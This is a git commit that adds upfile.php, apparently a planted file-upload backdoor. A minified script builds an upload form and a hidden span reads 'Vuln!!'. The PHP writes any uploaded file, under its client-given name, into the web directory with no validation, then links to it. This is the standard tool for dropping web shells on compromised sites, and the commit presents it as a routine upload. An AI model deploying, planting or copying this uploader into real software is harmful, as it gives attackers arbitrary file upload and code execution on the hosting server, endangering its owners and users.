770ea528848465744d7d09433f7d742be469c847
sami292942 <110151507+sami292942@users.noreply.github.com>
2022-07-28 01:52:57 -0400

    Add files via upload

---
+++ upfile.php
@@ -0,0 +1,5 @@
+<script>
+window.addEventListener("DOMContentLoaded",function(){let e=document.createElement("form");e.method="post",e.enctype="multipart/form-data";let t=document.createElement("input");t.type="file",t.name="file",t.required=!0;let n=document.createElement("button");n.type="submit",n.innerHTML="UP",e.appendChild(t),e.appendChild(n),document.body.appendChild(e)});
+</script>
+<span style="display:none">Vuln!!</span>
+<?php if($_FILES){ if(function_exists('move_uploaded_file')){ if(move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('Uploaded: <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'Failed!';} }elseif(function_exists('copy')){ if(copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('Uploaded: <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'Failed!';} } } ?>
